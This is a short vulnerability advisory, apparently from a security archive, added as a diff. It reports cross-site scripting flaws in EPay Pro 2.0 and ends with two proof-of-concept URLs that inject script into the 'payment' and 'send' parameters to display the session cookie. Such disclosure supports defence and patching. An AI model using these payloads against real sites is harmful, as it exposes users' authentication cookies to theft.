@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/12974/info
+
+It is reported that EPay Pro is affected by various cross-site scripting vulnerabilities.
+
+These problems present themselves when malicious HTML and script code is sent to the application through multiple parameters.
+
+This issue may allow for theft of cookie-based authentication credentials or other attacks.
+
+EPay Pro version 2.0 is vulnerable to these issues. 
+
+http://www.example.com/epal/?order_num=crap&payment=">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&send=first&send=regular&send=priority&send=express
+Pops cookie
+
+http://www.example.com/epal/?order_num=crap&payment=crap&send=first&send=regular&send=priority&send='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+Pops cookie 
